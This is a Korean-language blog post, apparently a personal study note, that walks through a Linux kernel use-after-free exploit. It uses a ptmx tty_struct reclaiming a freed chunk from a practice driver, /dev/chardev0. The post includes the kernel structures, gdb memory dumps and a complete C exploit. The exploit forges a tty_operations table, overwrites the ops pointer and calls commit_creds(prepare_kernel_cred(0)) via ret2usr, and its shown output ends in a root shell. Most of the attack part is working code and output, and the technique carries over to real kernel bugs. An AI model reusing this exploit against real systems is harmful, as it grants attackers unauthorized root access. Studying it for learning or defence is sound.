---
title: Use After Free with tty struct
author: Beomsu Lee
category: [Exploitation, Kernel]
tags: [exploitation, kernel, use after free]
math: true
mermaid: true
---

## struct tty_struct

`tty_struct` 변수는 특정 tty 포트의 현재 상태를 유지하기 위해 tty 코어에서 사용된다. uaf 취약점을 이용해 권한상승에 사용할 필드는 `*ops` 필드이다.

## Exploit plan

1. user 프로그램에서 `tty_operation` 구조체 생성
2. 권한상승에 사용할 필드에 권한상승 함수의 주소 저장(ret2usr)
3. uaf 취약점을 이용해 `*ops` 필드에 유저 프로그램에 생성된 `가짜 tty_operation 구조체의 주소`를 저장

```c
// /include/linux/tty.h
struct tty_struct {
    int magic;
    struct kref kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;
    int index;

    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;

    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    spinlock_t ctrl_lock;
    spinlock_t flow_lock;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    struct termiox *termiox;    /* May be NULL for unsupported */
    char name[64];
    struct pid *pgrp;       /* Protected by ctrl lock */
    struct pid *session;
    unsigned long flags;
    int count;
    struct winsize winsize;     /* winsize_mutex */
    unsigned long stopped:1,    /* flow_lock */
            flow_stopped:1,
            unused:BITS_PER_LONG - 2;
    int hw_stopped;
    unsigned long ctrl_status:8,    /* ctrl_lock */
            packet:1,
            unused_ctrl:BITS_PER_LONG - 9;
    unsigned int receive_room;  /* Bytes free for queue */
    int flow_change;

    struct tty_struct *link;
    struct fasync_struct *fasync;
    int alt_speed;      /* For magic substitution of 38400 bps */
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
};
```

```c
// tty_operations
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct inode *inode, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
            const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
```

## ptmx

`ptmx_open()` 함수에서 `tty_struct` 구조체 변수를 선언한다. 해당 변수에 `tty_init_dev()` 함수 리턴값을 저장한다.

```c
// /drivers/tty/pty.c
static int ptmx_open(struct inode *inode, struct file *filp)
{
    struct tty_struct *tty;  <-- 
    struct inode *slave_inode;
    int retval;
    int index;

    nonseekable_open(inode, filp);

    /* We refuse fsnotify events on ptmx, since it's a shared resource */
    filp->f_mode |= FMODE_NONOTIFY;

    retval = tty_alloc_file(filp);
    if (retval)
        return retval;

    /* find a device that is not in use. */
    mutex_lock(&devpts_mutex);
    index = devpts_new_index(inode);
    if (index < 0) {
        retval = index;
        mutex_unlock(&devpts_mutex);
        goto err_file;
    }

    mutex_unlock(&devpts_mutex);

    mutex_lock(&tty_mutex);
    tty = tty_init_dev(ptm_driver, index); <--

    if (IS_ERR(tty)) {
        retval = PTR_ERR(tty);
        goto out;
    }

    /* The tty returned here is locked so we can safely
    drop the mutex */
    mutex_unlock(&tty_mutex);
...
```

**alloc_tty_struct()**

```c
// /drivers/tty/tty_io.c
struct tty_struct *tty_init_dev(struct tty_driver *driver,intidx)
{
    struct tty_struct *tty;
    int retval;
    /*
    * First time open is complex, especially for PTY devices.
    * This code guarantees that either everything succeeds and the
    * TTY is ready for operation, or else the table slots are vacated
    * and the allocated memory released.  (Except that the termios
    * and locked termios may be retained.)
    */
    if (!try_module_get(driver->owner))
        return ERR_PTR(-ENODEV);
    tty = alloc_tty_struct(driver, idx); <-- 
    if (!tty) {
        retval = -ENOMEM;
        goto err_module_put;
    }
    tty_lock(tty);
    retval = tty_driver_install_tty(driver, tty);
...
```

`tty_struct` 구조체 변수를 선언한다. 해당 변수에 `kzalloc()` 호출하여 할당받은 heap 영역의 시작 주소 저장한다. `tty_struct` 구조체 크기의 heap 영역 할당한다. 즉, 해당 영역을 uaf 취약점 대상으로 사용 가능하다.

```c
// /drivers/tty/tty_io.c
struct tty_struct *alloc_tty_struct(struct tty_driver *driver, int idx)
{
    struct tty_struct *tty;

    tty = kzalloc(sizeof(*tty), GFP_KERNEL);
    if (!tty)
        return NULL;

    kref_init(&tty->kref);
    tty->magic = TTY_MAGIC;
    tty_ldisc_init(tty);
    tty->session = NULL;
    tty->pgrp = NULL;
...
```

## kzalloc

`kmalloc()` 함수와 같이 kernel 영역에 heap 영역을 할당하고, 해당 영역의 값을 0으로 설정한다.

1. 1번째 인자(크기)
2. 2번째 인자(유형) 
    - kernel ram에 메모리를 할당하기 위해 `GFP_KERNEL` flag 사용

## Set environment

use-after-free(`struct cred`)에서 사용한 모듈과 동일한 모듈을 사용한다.

## Proof of concept

## Exploit plan

1. `chardev_ioctl()` 함수를 이용해 `tty_struct` 크기만큼 heap 영역 할당
2. 할당된 heap 영역 해제
3. `ptmx()` 디바이스 open
4. `ptmx` 디바이스의 `tty_struct`를 유저 공간으로 받아와 `const struct tty_operations *ops` 멤버를 생성한 가짜 `tty_operations`로 덮음
5. 생성한 가짜 `tty_operations`를 `ptmx`의 struct `tty_struct`가` 있는 heap 영역에 덮어씀
6. `ptmx` 디바이스를 `write()` 함수로 호출하면 fake `tty_struct` -> fake `tty_operations` -> ret2usr 순으로 호출하며 root 권한 획득

**tty_struct 크기**

```
(gdb) p sizeof(struct tty_struct)
$6 = 736
```

`alloc_tty_struct()` 함수의 `kzalloc()`으로 heap 영역 할당 시 사용된 영역이 할당된다.

```
1: x/i $rip
=> 0xffffffffc01e219d:  call   0xffffffff811dd600 <kfree>
(gdb) info r rdi
rdi            0xffff880123523400  -131936507776000
(gdb) c
1: x/i $rip
=> 0xffffffff814c6e5e <alloc_tty_struct+46>:    test   rax,rax
(gdb) info r 
rax            0xffff880123522400  -131936507780096
```

`tty_struct`, `file_operations` 확인한다.

```
(gdb) p *(struct tty_struct*)0xffff880078598c00
$2 = {magic = 21505, kref = {refcount = {counter = 1}}, 
dev = 0x0 <irq_stack_union>, driver = 0xffff880138232780, 
ops = 0xffffffff818713c0 <ptm_unix98_ops>, index = 0, ldisc_sem = {
    count = 0, wait_lock = {raw_lock = {val = {counter = 0}}}, 
    wait_readers = 0, read_wait = {next = 0xffff880078598c38, 
    prev = 0xffff880078598c38}, write_wait = {next = 0xffff880078598c48, 
    prev = 0xffff880078598c48}}, ldisc = 0xffff8800b8ea5490, 
atomic_write_lock = {count = {counter = 1}, wait_lock = {{rlock = {
        raw_lock = {val = {counter = 0}}}}}, wait_list = {
    next = 0xffff880078598c68, prev = 0xffff880078598c68}, 
    owner = 0x0 <irq_stack_union>, osq = {tail = {counter = 0}}}, 
legacy_mutex = {count = {counter = 1}, wait_lock = {{rlock = {raw_lock = {
            val = {counter = 0}}}}}, wait_list = {next = 0xffff880078598c90, 
    prev = 0xffff880078598c90}, owner = 0x0 <irq_stack_union>, osq = {
    tail = {counter = 0}}}, throttle_mutex = {count = {counter = 1}, 
    wait_lock = {{rlock = {raw_lock = {val = {counter = 0}}}}}, wait_list = {
    next = 0xffff880078598cb8, prev = 0xffff880078598cb8}, 
    owner = 0x0 <irq_stack_union>, osq = {tail = {counter = 0}}}, 
termios_rwsem = {count = 0, wait_list = {next = 0xffff880078598ce0, 
    prev = 0xffff880078598ce0}, wait_lock = {raw_lock = {val = {
        counter = 0}}}, osq = {tail = {counter = 0}}, 
    owner = 0x0 <irq_stack_union>}, winsize_mutex = {count = {counter = 1}, 
    wait_lock = {{rlock = {raw_lock = {val = {counter = 0}}}}}, wait_list = {
    next = 0xffff880078598d08, prev = 0xffff880078598d08}, 
    owner = 0x0 <irq_stack_union>, osq = {tail = {counter = 0}}}, 
ctrl_lock = {{rlock = {raw_lock = {val = {counter = 0}}}}}, flow_lock = {{
    rlock = {raw_lock = {val = {counter = 0}}}}}, termios = {c_iflag = 0, 
    c_oflag = 0, c_cflag = 0, c_lflag = 0, c_line = 0 '\000', 
--Type <RET> for more, q to quit, c to continue without paging--
    c_cc = '\000' <repeats 18 times>, c_ispeed = 0, c_ospeed = 0}, 
termios_locked = {c_iflag = 0, c_oflag = 0, c_cflag = 0, c_lflag = 0, 
    c_line = 0 '\000', c_cc = '\000' <repeats 18 times>, c_ispeed = 0, 
    c_ospeed = 0}, termiox = 0x0 <irq_stack_union>, 
name = "ptm0", '\000' <repeats 59 times>, pgrp = 0x0 <irq_stack_union>, 
session = 0x0 <irq_stack_union>, flags = 0, count = 0, winsize = {
    ws_row = 0, ws_col = 0, ws_xpixel = 0, ws_ypixel = 0}, stopped = 0, 
flow_stopped = 0, unused = 0, hw_stopped = 0, ctrl_status = 0, packet = 0, 
unused_ctrl = 0, receive_room = 0, flow_change = 0, 
link = 0x0 <irq_stack_union>, fasync = 0x0 <irq_stack_union>, 
alt_speed = 0, write_wait = {lock = {{rlock = {raw_lock = {val = {
            counter = 0}}}}}, task_list = {next = 0xffff880078598e38, 
    prev = 0xffff880078598e38}}, read_wait = {lock = {{rlock = {raw_lock = {
            val = {counter = 0}}}}}, task_list = {next = 0xffff880078598e50, 
    prev = 0xffff880078598e50}}, hangup_work = {data = {
    counter = 68719476704}, entry = {next = 0xffff880078598e68, 
    prev = 0xffff880078598e68}, func = 0xffffffff814c5120 <do_tty_hangup>}, 
disc_data = 0x0 <irq_stack_union>, driver_data = 0x0 <irq_stack_union>, 
tty_files = {next = 0xffff880078598e90, prev = 0xffff880078598e90}, 
closing = 0, write_buf = 0x0 <irq_stack_union>, write_cnt = 0, SAK_work = {
    data = {counter = 68719476704}, entry = {next = 0xffff880078598ec0, 
    prev = 0xffff880078598ec0}, func = 0xffffffff814c6e10 <do_SAK_work>}, 
port = 0x0 <irq_stack_union>}

(gdb) p *(struct file_operations*)0xffffffff818713c0
$3 = {owner = 0xffffffff814cf300 <ptm_unix98_lookup>, 
llseek = 0xffffffff814d0280 <pty_unix98_install>, 
read = 0xffffffff814cf320 <pty_unix98_remove>, 
write = 0xffffffff814cf230 <pty_open>, 
read_iter = 0xffffffff814cfbc0 <pty_close>, 
write_iter = 0xffffffff814cf5f0 <pty_unix98_shutdown>, 
iterate = 0xffffffff814cf5d0 <pty_cleanup>, 
poll = 0xffffffff814cf570 <pty_write>, 
unlocked_ioctl = 0x0 <irq_stack_union>, 
compat_ioctl = 0x0 <irq_stack_union>, 
mmap = 0xffffffff814cf7f0 <pty_write_room>, 
open = 0xffffffff814cf220 <pty_chars_in_buffer>, 
flush = 0xffffffff814cfb10 <pty_unix98_ioctl>, 
release = 0x0 <irq_stack_union>, fsync = 0x0 <irq_stack_union>, 
aio_fsync = 0x0 <irq_stack_union>, 
fasync = 0xffffffff814cf540 <pty_unthrottle>, lock = 0x0 <irq_stack_union>, 
sendpage = 0x0 <irq_stack_union>, 
get_unmapped_area = 0x0 <irq_stack_union>, 
check_flags = 0x0 <irq_stack_union>, 
flock = 0xffffffff814cfd50 <pty_flush_buffer>, 
splice_write = 0x0 <irq_stack_union>, splice_read = 0x0 <irq_stack_union>, 
setlease = 0x0 <irq_stack_union>, fallocate = 0x0 <irq_stack_union>, 
show_fdinfo = 0x0 <irq_stack_union>}
```

## Exploit code

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include "chardev.h"
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>

#define SIZE 736

void *(*prepare_kernel_cred)(void*);
int (*commit_creds)(void*);

void get_root(){
    commit_creds(prepare_kernel_cred(0));
}

unsigned long kallsyms_getaddr(const char *str){
    FILE *fp;
    char buf[256];
    char addr[32];
    char sym[128];
    fp = fopen("/proc/kallsyms","r");
    while(fgets(buf,sizeof(buf),fp) != NULL){
        sscanf(buf,"%s %*s %s",addr,sym);
        if(strcmp(sym,str)==0){
            //printf("sym: %s, addr: %s\n",sym,addr);
            return strtoul(addr,NULL,16);
        }
    }
    return -1;
}

int main(){
    int fd,tty_fd,ret,i;
    char buf[736];
    
    prepare_kernel_cred = kallsyms_getaddr("prepare_kernel_cred");
    if(prepare_kernel_cred < 0){
        perror("kallsyms error");
        exit(-1);
    }
    printf("prepare_kernel_cred: 0x%lx\n",prepare_kernel_cred);
    commit_creds = kallsyms_getaddr("commit_creds");
    if(commit_creds < 0){
        perror("kallsyms error");
        exit(-1);
    }
    printf("commit_cred: 0x%lx\n",commit_creds);

    fd = open("/dev/chardev0",O_RDWR);
    if(fd < 0){
        perror("open error");
        exit(-1);
    }
    ret = ioctl(fd,KMALLOC,SIZE);
    if(ret < 0) perror("kmalloc error");

    ret = ioctl(fd,KFREE);
    if(ret < 0) perror("kfree error");

    tty_fd = open("/dev/ptmx",O_RDWR|O_NOCTTY);
    if(fd < 0){
        perror("open error");
        exit(-1);
    }

    memset(buf,0,sizeof(buf));
    read(fd,buf,sizeof(buf)-1);

    void *fake_tty_operations[15];
    for(i=0;i<15;i++){
        fake_tty_operations[i] = 0x0;
    }
    fake_tty_operations[12] = (unsigned long)get_root;

    unsigned long fake_tty_struct[4] = {0};
    read(fd,fake_tty_struct,sizeof(fake_tty_struct));
    fake_tty_struct[3] = (unsigned long)fake_tty_operations;
    write(fd,fake_tty_struct,sizeof(fake_tty_struct));
    
    ioctl(tty_fd,0,0);
    printf("uid: %d\n",getuid());
    execl("/bin/sh","sh",NULL);
/*
    for(i=0;i<sizeof(buf);i++){
        if(i%0x10==0 && i!=0) printf("\n");
        printf("%02x ",buf[i] & 0xff);
    }
*/
    if(close(fd) < 0){
        perror("close error");
        exit(-1);
    }

    printf("\n");

    if(close(tty_fd) < 0) perror("close error");

    return 0;
}
```

## Exploit

```bash
bs@bs-virtual-machine:~/Desktop$ ./test 
prepare_kernel_cred: 0xffffffff8109da40
commit_cred: 0xffffffff8109d760
uid: 0
# id
uid=0(root) gid=0(root) groups=0(root)
```

## References
- [07.Use-After-Free(UAF) (feat.tty_struct)](https://www.lazenca.net/pages/viewpage.action?pageId=29327365)
- [CISCN 2017 babydriver Write-Up (linux kernel UAF)](https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/)